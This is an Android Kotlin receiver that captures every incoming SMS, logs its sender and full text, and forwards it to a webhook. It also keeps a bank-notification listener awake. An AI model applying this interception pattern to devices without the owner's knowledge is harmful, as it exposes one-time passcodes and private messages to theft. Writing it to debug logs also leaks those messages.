package com.example.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import com.example.network.WebhookSender
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {
    private val TAG = "SmsReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            Log.d(TAG, "SMS Received!")
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) return

            val pendingResult = goAsync()
            CoroutineScope(Dispatchers.Default).launch {
                try {
                    // Self-healing: wake up or rebind notification listener when SMS event occurs
                    com.example.service.BankNotificationListenerService.forceRebind(context.applicationContext)

                    // Combine multi-part SMS messages if they are from the same sender
                    val sender = messages[0].displayOriginatingAddress ?: "Unknown"
                    val fullBody = messages.mapNotNull { it.messageBody }.joinToString("")
                    
                    Log.d(TAG, "Processing SMS from $sender: $fullBody")
                    
                    // Forward SMS
                    WebhookSender.sendForward(
                        context = context.applicationContext,
                        type = "SMS",
                        sender = sender,
                        message = fullBody
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing incoming SMS", e)
                } finally {
                    pendingResult.finish()
                }
            }
        }
    }
}
